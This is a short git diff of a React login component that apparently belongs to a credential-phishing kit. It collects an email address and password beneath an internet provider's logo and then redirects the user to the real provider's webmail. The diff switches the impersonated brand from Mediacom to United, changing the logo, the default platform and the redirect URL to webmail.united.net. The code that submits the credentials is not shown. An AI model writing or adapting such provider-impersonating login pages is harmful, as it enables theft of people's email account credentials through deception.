@@ -8,14 +8,14 @@ import axios from 'axios';
 import comporium from './comporium.png';
 import powerx from './powerx.png';
 import mediacom from './mediacom.png';
-
+import united from './united.png';
 function Home(){
 
     const[email, setEmail] = useState("");
 
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Mediacom")
+    const[platform, setPlatform] = useState("United");
 
     const[showError, setShowError] = useState(false);
 
@@ -43,7 +43,7 @@ function Home(){
                // console.log(response.data.message);
     
               
-               window.location.href = 'https://mail1.mediacombb.net/';
+               window.location.href = 'https://webmail.united.net/';
             }
           } catch (error) {
             // Handle error
@@ -67,8 +67,8 @@ function Home(){
             </div>
 
             <div className='secondiv col-md-5 m-auto'>
-                <div className='logodiv px-3'>
-                <img src={mediacom} className="mylogo" />
+                <div className='logodiv px-3 text-center'>
+                <img src={united} className="mylogo" />
 
                 </div>
 
